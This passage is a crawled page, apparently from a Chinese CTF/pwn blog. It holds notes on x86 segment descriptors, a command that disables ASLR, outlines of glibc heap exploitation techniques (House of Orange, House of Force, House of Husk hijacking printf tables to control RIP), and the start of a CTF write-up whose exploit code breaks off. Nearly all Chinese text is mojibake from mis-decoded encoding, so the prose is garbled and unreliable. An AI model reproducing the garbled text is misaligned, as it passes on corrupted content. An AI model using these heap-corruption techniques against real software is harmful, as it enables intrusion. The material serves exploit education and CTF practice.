<p>ç¡®å®šæ®µé™é•¿æ‰©å±•çš„å¢é‡ã€‚å½“Gæ ‡å¿—ä¸º0ï¼Œæ®µé™é•¿ä»¥å­—èŠ‚ä¸ºå•ä½ï¼›Gæ ‡å¿—ä¸º1ï¼Œæ®µé™é•¿ä»¥4KB<br>
ä¸ºå•ä½ã€‚ï¼ˆè¿™ä¸ªæ ‡å¿—ä¸å½±å“æ®µåŸºå€çš„ç²’åº¦ï¼Œæ®µåŸºå€çš„ç²’åº¦æ°¸è¿œæ˜¯å­—èŠ‚ï¼‰å¦‚æœGæ ‡å¿—ä¸º1ï¼Œé‚£ä¹ˆå½“æ£€æµ‹åç§»é‡æ˜¯å¦è¶…è¶Šæ®µé™é•¿æ—¶ï¼Œä¸ç”¨æµ‹è¯•åç§»é‡çš„ä½12ä½ã€‚</p>
<p>å°†é€»è¾‘åœ°å€è½¬æ¢æˆçº¿æ€§åœ°å€çš„ï¼Œå¤„ç†å™¨ï¼š</p>
<ol>
<li class="lvl-3">
<p>åˆ†æ®µï¼šå¤„ç†å™¨é€šè¿‡æ®µé€‰æ‹©å­å’Œæ®µæè¿°ç¬¦å°†é€»è¾‘åœ°å€ä¸­çš„æ®µéƒ¨åˆ†ä¸æ®µåŸºå€ç›¸å¯¹åº”èµ·æ¥ã€‚æ®µåŸºå€è¡¨ç¤ºæ®µçš„èµ·å§‹åœ°å€ï¼Œæ®µé€‰æ‹©å­åŒ…å«äº†æ®µçš„ç´¢å¼•å’Œç‰¹æƒçº§ç­‰ä¿¡æ¯ã€‚</p>
</li>
<li class="lvl-3">
<p>åˆ†é¡µï¼šåœ¨åˆ†æ®µçš„åŸºç¡€ä¸Šï¼Œå¤„ç†å™¨ä½¿ç”¨é¡µè¡¨å°†é€»è¾‘åœ°å€ä¸­çš„é¡µéƒ¨åˆ†è½¬æ¢æˆç‰©ç†åœ°å€çš„é¡µè¡¨é¡¹ç´¢å¼•ï¼Œå¹¶è·å–å¯¹åº”çš„é¡µè¡¨é¡¹ã€‚</p>
</li>
<li class="lvl-3">
<p>åç§»è®¡ç®—ï¼šæ ¹æ®é€»è¾‘åœ°å€ä¸­çš„æ®µå†…åç§»éƒ¨åˆ†å’Œè·å–çš„é¡µè¡¨é¡¹ä¸­çš„é¡µæ¡†åŸºå€ï¼Œé€šè¿‡åŠ æ³•è¿ç®—å¾—å‡ºçº¿æ€§åœ°å€çš„åç§»éƒ¨åˆ†ã€‚</p>
</li>
<li class="lvl-3">
<p>çº¿æ€§åœ°å€ç”Ÿæˆï¼šå°†åˆ†æ®µçš„æ®µåŸºå€ä¸åç§»è®¡ç®—å¾—åˆ°çš„çº¿æ€§åœ°å€åç§»éƒ¨åˆ†ç›¸åŠ ï¼Œå³å¯å¾—åˆ°çº¿æ€§åœ°å€ã€‚</p>
</li>
</ol>
<h2 id="2-4-æè¿°ç¬¦çš„åˆ†ç±»"><strong><strong>2.4. æè¿°ç¬¦çš„åˆ†ç±»</strong></strong></h2>
<p><strong>ä»£ç æ®µ/æ•°æ®æ®µæè¿°ç¬¦</strong>ï¼š</p>
<p><img src="./images/065-read02/Untitled%208.png" alt="Untitled"></p>
<p>å½“æ®µæè¿°ç¬¦ä¸­çš„Sæ ‡å¿—ï¼ˆæè¿°ç¬¦ç±»å‹ï¼‰ä¸º1æ—¶ï¼Œè¯¥æè¿°ç¬¦ä¸ºä»£ç æ®µæè¿°ç¬¦æˆ–è€…æ•°æ®æ®µæè¿°ç¬¦ã€‚ç±»å‹åŸŸçš„æœ€é«˜ä½ï¼ˆæ®µæè¿°ç¬¦çš„ç¬¬äºŒä¸ªåŒå­—çš„ç¬¬11ä½ï¼‰å°†å†³å®šè¯¥æè¿°ç¬¦ä¸ºæ•°æ®æ®µæè¿°ç¬¦ï¼ˆä¸º0ï¼‰æˆ–è€…ä»£ç æ®µæè¿°ç¬¦ï¼ˆä¸º1ï¼‰ã€‚å¯¹äºæ•°æ®æ®µè€Œè¨€ï¼Œæè¿°ç¬¦çš„ç±»å‹åŸŸçš„ä½3ä½ï¼ˆä½8ï¼Œ9ï¼Œ10ï¼‰è¢«è§£é‡Šä¸ºè®¿é—®æ§åˆ¶ï¼ˆAï¼‰ï¼Œæ˜¯å¦å¯å†™ï¼ˆWï¼‰ï¼Œæ‰©å±•æ–¹å‘ï¼ˆEï¼‰ã€‚å‚è€ƒè¡¨3ï¼1å¯¹ä»£ç å’Œæ•°æ®æ®µæè¿°ç¬¦ç±»å‹åŸŸçš„è§£ç æè¿°ã€‚æ•°æ®æ®µå¯ä»¥æ˜¯åªè¯»æˆ–è€…å¯è¯»å†™çš„æ®µï¼Œè¿™å–å†³ä¸â€œæ˜¯å¦å¯å†™â€æ ‡å¿—ã€‚</p>
<p><strong>ç³»ç»Ÿæè¿°ç¬¦</strong>:</p>
<p>ç³»ç»Ÿæè¿°ç¬¦åˆ†ä¸ºï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>å±€éƒ¨æè¿°ç¬¦è¡¨ï¼ˆLDTï¼‰æ®µæè¿°ç¬¦</p>
</li>
<li class="lvl-2">
<p>ä»»åŠ¡çŠ¶æ€æ®µï¼ˆTSSï¼‰æè¿°ç¬¦</p>
</li>
<li class="lvl-2">
<p>è°ƒç”¨é—¨æè¿°ç¬¦</p>
</li>
<li class="lvl-2">
<p>ä¸­æ–­é—¨æè¿°ç¬¦</p>
</li>
<li class="lvl-2">
<p>é™·é˜±é—¨æè¿°</p>
</li>
<li class="lvl-2">
<p>ä»»åŠ¡é—¨æè¿°ç¬¦</p>
</li>
</ul>
<p>è¿™äº›æè¿°ç¬¦åˆå¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼šç³»ç»Ÿæ®µæè¿°ç¬¦å’Œé—¨æè¿°ç¬¦ã€‚ç³»ç»Ÿæ®µæè¿°ç¬¦æŒ‡å‘ç³»ç»Ÿæ®µï¼ˆLDT<br>
å’ŒTSSæ®µï¼‰ã€‚é—¨æè¿°ç¬¦å®ƒä»¬è‡ªèº«å°±æ˜¯â€œé—¨â€œï¼Œå®ƒä»¬æˆ–è€…æŒæœ‰æŒ‡å‘åœ¨ä»£ç æ®µçš„è¿‡ç¨‹çš„å…¥å£ç‚¹</p>
<p>çš„æŒ‡é’ˆï¼Œæˆ–è€…æŒæœ‰TSSï¼ˆä»»åŠ¡é—¨ï¼‰çš„æ®µé€‰æ‹©ç¬¦ã€‚</p>
<p><img src="./images/065-read02/Untitled%209.png" alt="Untitled"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/30/%E5%85%B3%E9%97%ADaslr%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.png">
      <meta itemprop="name" content="hkbin">
      <meta itemprop="description" content="hkbin hkbin hkbin">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hkbinçš„å°åšå®¢~">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/30/%E5%85%B3%E9%97%ADaslr%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95/" class="post-title-link" itemprop="url">å…³é—­aslrè¿›è¡Œè°ƒè¯•</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-09-30 16:39:15 / ä¿®æ”¹æ—¶é—´ï¼š16:40:21" itemprop="dateCreated datePublished" datetime="2023-09-30T16:39:15+08:00">2023-09-30</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
                  ï¼Œ
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/kernel/" itemprop="url" rel="index"><span itemprop="name">kernel</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>193</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>1 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>ASLRæ˜¯ä¸€ç§éšæœºåŒ–ä¿æŠ¤çš„æ–¹æ³•ï¼Œlinuxè‡ªå¸¦ï¼Œå®ƒä½¿å¾—æ ˆã€åº“ã€å †ç­‰åœ°å€éšæœºåŒ–ï¼Œå¯¹æ”»å‡»è¾¾åˆ°ä¸€ä¸ªå¹²æ‰°çš„æ•ˆæœ</strong></p>
<p>è€Œåœ¨pwné¢˜é‡Œé¢ï¼Œé’ˆå¯¹ldçš„æ”»å‡»ï¼Œåœ¨ubuntu22.04ä¸‹ä¸çŸ¥é“ä¸ºä½•ldçš„åŸºå€å’Œlibcçš„åŸºå€è·ç¦»ä¸€ç›´å˜åŒ–(ä¸€èˆ¬æ˜¯ä¸å˜åŒ–çš„ï¼Œä½¿å¾—æˆ‘å¯¹ldçš„æ”»å‡»è°ƒè¯•æå…¶ä¸æ–¹ä¾¿</p>
<p>å¯ä»¥é€šè¿‡linuxä¸€æ¡å‘½ä»¤ ä¸´æ—¶å…³é—­aslrï¼Œè¿›è¡Œè°ƒè¯•ï¼Œä¸è¿‡è¦æ³¨æ„è¿œç¨‹çš„è¿™ä¸ªè·ç¦»å’Œæœ¬åœ°çš„è·ç¦»ä¸€èˆ¬æ˜¯ä¸ä¸€æ ·çš„(ç›¸å·®ä¼šåœ¨ç¬¬1.5ä¸ªå­—èŠ‚åˆ°ç¬¬2.5ä¸ªå­—èŠ‚ä¹‹é—´</p>
<p>æ¯”å¦‚0x7ffff7fc3000ï¼Œæ‰€ä»¥ä¸€èˆ¬æ‰“è¿œç¨‹éœ€è¦çˆ†ç ´ä¸¤ä¸ªå­—èŠ‚ï¼Œåé¢ä¼šç»™å‡ºçˆ†ç ´çš„è„šæœ¬</p>
<p>å…³é—­aslrï¼š</p>
<pre><code class="language-python">sudo sysctl -w kernel.randomize_va_space=0</code></pre>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/27/%E9%92%88%E5%AF%B9topchunk%E7%9A%84%E6%94%BB%E5%87%BB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.png">
      <meta itemprop="name" content="hkbin">
      <meta itemprop="description" content="hkbin hkbin hkbin">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hkbinçš„å°åšå®¢~">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/27/%E9%92%88%E5%AF%B9topchunk%E7%9A%84%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">é’ˆå¯¹topchunkçš„æ”»å‡»</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-09-27 11:00:48 / ä¿®æ”¹æ—¶é—´ï¼š11:06:15" itemprop="dateCreated datePublished" datetime="2023-09-27T11:00:48+08:00">2023-09-27</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>414</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-of-orange">House_of_orange</h2>
<h3 id="æ”»å‡»æ¡ä»¶">æ”»å‡»æ¡ä»¶</h3>
<p>èƒ½å¤Ÿä¿®æ”¹åˆ°top_chunkçš„sizeå€¼</p>
<p>å¯ä»¥å¾—åˆ°ä¸€ä¸ªunsortedbin</p>
<p>glibc â‰¤ 2.23</p>
<h3 id="æ”»å‡»åŸç†">æ”»å‡»åŸç†</h3>
<p>å½“mallocçš„å€¼â‰¥0x20000çš„æ—¶å€™ä¼šè°ƒç”¨mmapæ¥åˆ†é…ï¼Œè€Œä½äºåˆ™ä¼šåˆ‡å‰²top_chunkæ¥åˆ†é…</p>
<p>å½“top_chunkä¸å¤Ÿåˆ†é…çš„æ—¶å€™ï¼Œä¼šæŠŠå½“å‰top_chunké‡Šæ”¾ï¼Œç„¶åå†é‡æ–°ç”³è¯·ä¸€ä¸ªå¤§çš„top_chunk</p>
<h3 id="æ”»å‡»æ–¹å¼">æ”»å‡»æ–¹å¼</h3>
<p>çœ‹top_chunkçš„sizeå€¼ï¼Œæ¯”å¦‚0x20791è¿™æ ·å­</p>
<p>æ”¹ä¸º0x791ï¼Œå†ç”³è¯·ä¸€ä¸ªå¤§çš„å³å¯æ— ä¸­ç”Ÿæœ‰ä¸€ä¸ªunsorted binå‡ºæ¥</p>
<p>éšåå¦‚æœèƒ½å¤Ÿä¿®æ”¹åˆ°unsortedbinçš„bkä½ï¼Œå³å¯å®ç°unsorted bin attack</p>
<p>ä¸€èˆ¬åç»­æ”»å‡»æ˜¯æŒŸæŒIO_list_allæŒ‡é’ˆ</p>
<p>unsorted bin attackå®ç°çš„æ˜¯å°†main_arena+0x88å†™åˆ°IO_list_allå¤„</p>
<p><img src="./images/%E9%92%88%E5%AF%B9topchunk%E7%9A%84%E6%94%BB%E5%87%BB%20f1d06547f1eb468f9311541953a1de96/Untitled.png" alt="Untitled"></p>
<p>æ­¤æ—¶è¦æ§åˆ¶å¥½main_arena+0x88å¤„çš„IO_FILEçš„_chainå³å¯(</p>
<p>è¿™ç§æ”»å‡»æ˜¯é€šè¿‡abortæµæ”»å‡»çš„(å› ä¸ºunsorted binç»“æ„è¢«ç ´å</p>
<p>å½“å†æ¬¡ç”³è¯·å†…å­˜çš„æ—¶å€™</p>
<p>è°ƒç”¨æµä¸ºmallocâ†’mallocâ†’printerrâ†’__libc_messageâ†’abort()â†’_IO_flush_all_lockp()â†’_IO_overflow</p>
<p>ä½†æ˜¯2.27ä»¥åŠä»¥åçš„ç‰ˆæœ¬å–æ¶ˆäº†abortåˆ·æ–°æµçš„æ“ä½œï¼Œè¿™ä¸ªæ”»å‡»æ–¹å¼å°±å¤±æ•ˆäº†(</p>
<p>ä¸è¿‡é‡Šæ”¾åˆ°unsorted binè¿™ä¸€æ­¥ä¹‹å‰è¿˜æ˜¯å¯ä»¥çš„</p>
<h2 id="House-of-force">House of force</h2>
<h3 id="æ”»å‡»æ¡ä»¶-2">æ”»å‡»æ¡ä»¶</h3>
<p>èƒ½å¤Ÿä¿®æ”¹åˆ°topchunkçš„sizeå€¼</p>
<p>glibc â‰¤ 2.29</p>
<h3 id="æ”»å‡»åŸç†-2">æ”»å‡»åŸç†</h3>
<p>ä¿®æ”¹top_chunkçš„sizeä¸º-1ï¼Œèƒ½è¿‡è¿‡æ‰æ ¡éªŒ</p>
<p>ç„¶åå¯ä»¥é€šè¿‡ç”³è¯·å†…å­˜ï¼Œå°†top_chunkæ¨è‡³æŒ‡å®šå†…å­˜ç©ºé—´ï¼Œç„¶åmallocå³å¯ç”³è¯·åˆ°é‚£éƒ¨åˆ†å†…å­˜</p>
<p>ç”±äº2.29åŠå…¶ä»¥å‰ä½¿ç”¨ï¼Œå¸¸ç”¨åœ¨2.27+çš„æ—¶å€™ï¼Œå¯ä»¥å°èŒƒå›´å°†top_chunkæ¨è‡³tcache structç»“æ„ä½“é‡Œï¼Œä¿®æ”¹entry_pointå®ç°tcache posioning attack</p>
<p>å› ä¸ºæ˜¯ç›¸å¯¹ä½ç§»ï¼Œ<strong>æ‰€ä»¥ä¸éœ€è¦leakå‡ºå †åœ°å€ã€‚</strong></p>
<h3 id="æ”»å‡»æ–¹æ³•">æ”»å‡»æ–¹æ³•</h3>
<p>æ¯”å¦‚å½“å‰top_chunk_addr = 0x501000</p>
<p>malloc(-0x1000)å³å¯å°†top_chunk_addræ¨è‡³0x500000é™„è¿‘</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/26/house-of-husk/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.png">
      <meta itemprop="name" content="hkbin">
      <meta itemprop="description" content="hkbin hkbin hkbin">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hkbinçš„å°åšå®¢~">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/26/house-of-husk/" class="post-title-link" itemprop="url">house_of_husk</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-09-26 23:50:24" itemprop="dateCreated datePublished" datetime="2023-09-26T23:50:24+08:00">2023-09-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2023-09-27 11:02:26" itemprop="dateModified" datetime="2023-09-27T11:02:26+08:00">2023-09-27</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>273</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>1 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="æ”»å‡»æ–¹å¼">æ”»å‡»æ–¹å¼</h2>
<p>house_of_huskæ˜¯é’ˆå¯¹å¸¦æ ¼å¼åŒ–å­—ç¬¦è¾“å‡ºprintfå‡½æ•°çš„ä¸€ç§æ”»å‡»</p>
<p>å¯ä»¥å®ç°æ§åˆ¶rip</p>
<p>é€‚ç”¨ç‰ˆæœ¬2.23-è‡³ä»Š</p>
<h2 id="æ”»å‡»æ–¹æ³•">æ”»å‡»æ–¹æ³•</h2>
<p><strong>printfä¼šè¾“å‡ºå‰æ£€æŸ¥æ˜¯å¦æœ‰è‡ªå®šä¹‰æ ¼å¼åŒ–å­—ç¬¦</strong></p>
<p>æ–¹æ³•æ˜¯é€šè¿‡ä¸¤ä¸ªè¡¨ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>__printf_function_table</p>
</li>
<li class="lvl-2">
<p>__printf_arginfo_table</p>
</li>
</ul>
<ol>
<li class="lvl-3">
<p>å…ˆå°†__printf_function_tableçš„å€¼ç½®ä¸ºéç©º</p>
</li>
</ol>
<p><img src="./images/house_of_husk%205b722a531dbd41f9afdaaeb0d5208a54/Untitled.png" alt="Untitled"></p>
<ol>
<li class="lvl-3">
<p>ç„¶åå°†__printf_arginfo_tableæŒŸæŒåˆ°æˆ‘ä»¬å¯æ§çš„åœ°å€</p>
</li>
</ol>
<p><img src="./images/house_of_husk%205b722a531dbd41f9afdaaeb0d5208a54/Untitled%201.png" alt="Untitled"></p>
<p><s>å¾€å¯æ§çš„åœ°æ–¹å†™å€¼ï¼Œè¿™ä¸ªæœ‰è®²ç©¶(</s></p>
<p>æœ€ç»ˆä¼šè°ƒç”¨åˆ°__printf_arginfo_table[index]</p>
<p>è¿™ä¸ªindexå’Œæ ¼å¼åŒ–å­—ç¬¦çš„æœ‰å…³ï¼š</p>
<p>æ¯”å¦‚%d â†’ ord(â€™dâ€™) â†’ 100</p>
<p>%s â†’ ord(â€™sâ€™) â†’ 115</p>
<p>æ‰€ä»¥æŒŸæŒ__printf_arginfo_tableçš„æ—¶å€™ï¼Œæ¯”å¦‚æ ¼å¼åŒ–å­—ç¬¦æ˜¯%d</p>
<p>é‚£æˆ‘ä»¬å°±å¼„æˆ=</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__printf_arginfo_table = control_addr - ord(<span class="string">&#x27;d&#x27;</span>)*<span class="number">8</span></span><br></pre></td></tr></table></figure>
<p>ç„¶åå¾€control_addré‡Œé¢å†™å…¥RIPå³å¯</p>
<p><img src="./images/house_of_husk%205b722a531dbd41f9afdaaeb0d5208a54/Untitled%202.png" alt="Untitled"></p>
<p>å…¶æ§åˆ¶æµä¸ºï¼š</p>
<p>printfâ†’vfprintfâ†’printf_positionalâ†’__parse_one_specmbâ†’RIP</p>
<h2 id="æ”»å‡»åŸç†">æ”»å‡»åŸç†</h2>
<p>printfä¼šæ£€æŸ¥æ˜¯å¦æœ‰è‡ªå®šä¹‰æ ¼å¼åŒ–å­—ç¬¦(æ£€æŸ¥çš„å°±æ˜¯__printf_function_tableæ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºï¼Œåˆ™ä»£è¡¨æœ‰è‡ªå®šä¹‰æ ¼å¼åŒ–å­—ç¬¦ï¼Œç„¶åå°±ä¼šæ”¾å¼ƒé»˜è®¤è¾“å‡ºæ–¹å¼ï¼Œè€Œå»æ‰¾__printf_arginfo_tableé‡Œé¢çš„è°ƒç”¨å‡½æ•°</p>
<p>å°†æ­¤ä¸¤è¡¨æŒŸæŒï¼Œå³å¯æˆåŠŸæ§åˆ¶RIP</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/25/brics-ctf-pwn-paint%E9%A2%98%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.png">
      <meta itemprop="name" content="hkbin">
      <meta itemprop="description" content="hkbin hkbin hkbin">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hkbinçš„å°åšå®¢~">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/25/brics-ctf-pwn-paint%E9%A2%98%E8%A7%A3/" class="post-title-link" itemprop="url">brics-ctf-pwn painté¢˜è§£</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-09-25 20:22:39 / ä¿®æ”¹æ—¶é—´ï¼š20:24:48" itemprop="dateCreated datePublished" datetime="2023-09-25T20:22:39+08:00">2023-09-25</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>1.7k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="æ€è·¯">æ€è·¯</h2>
<p>è§‚å¯Ÿaddå‡½æ•°å¯çŸ¥ï¼Œidxéšä¾¿æº¢ï¼Œbssæ®µé™„è¿‘æœ‰stdout@GLIBC_2_2_5å’Œstdin@GLIBC_2_2_5</p>
<p>å¯ä»¥å°†libcåŸºå€leakå‡ºæ¥</p>
<p>å¤šæ¬¡leakå‡ºæ¥ä¹‹åå¯ä»¥å‘ç°è¿œç¨‹ç‰ˆæœ¬æ˜¯2.35(å’Œubuntu22.04é»˜è®¤é“¾æ¥ä¸‹æ˜¯ä¸€æ ·çš„libc</p>
<p>æ¥ç€æ˜¯éœ€è¦leakå‡ºå †åœ°å€</p>
<p>tcacheåœ¨é«˜ç‰ˆæœ¬ä¼šæœ‰ä¸ªkeyï¼Œè·Ÿåœ¨fdåé¢ï¼Œåªè¦åˆ©ç”¨rateå‡½æ•°é‡Œçš„commentï¼Œå¤šå¼„å‡ ä¸ªå¤§å°ä¸º0x30çš„å †ï¼Œé€ æˆå †å—ç®¡ç†æ··ä¹±ï¼Œå°±å¯ä»¥leakå‡ºkeyçš„å€¼ï¼Œæ²¡æœ‰æŒ‡å‘çš„æ—¶å€™keyçš„å€¼ä¸ºL &gt;&gt; 12</p>
<p>å…¶ä¸­Læ˜¯tcachebinçš„addrï¼Œç„¶åå†&lt;&lt;12å³å¯å¾—åˆ°å †çš„åˆå§‹åœ°å€</p>
<p>leakå®Œlibcå’Œheapä¹‹åï¼Œå¾—æƒ³åŠæ³•æŒŸæŒ_IO_list_allæˆ–_chain</p>
<p>bssæ®µé‡Œé¢æœ‰ä¸ªmagic_value</p>
<p>â†’__dso_handle</p>
<p>è¿™ä¸ªä¸œè¥¿ä¼šæŒ‡å‘è‡ªå·±ï¼Œç„¶ååˆ©ç”¨rateå³å¯åœ¨bssåŒºå†™å…¥ä¸€ä¸ªå®Œå…¨å¯æ§çš„å †åœ°å€ï¼Œä¹‹åå¾€å †åœ°å€å¯¹åº”çš„åœ°æ–¹å¡«å…¥_IO_list_allï¼Œç„¶ådrawå³å¯</p>
<p>é«˜ç‰ˆæœ¬æ‰“house_of_apple twoå³å¯(å †å—å®Œå…¨å¯æ§ ğŸ˜µ</p>
<h2 id="exp">exp</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 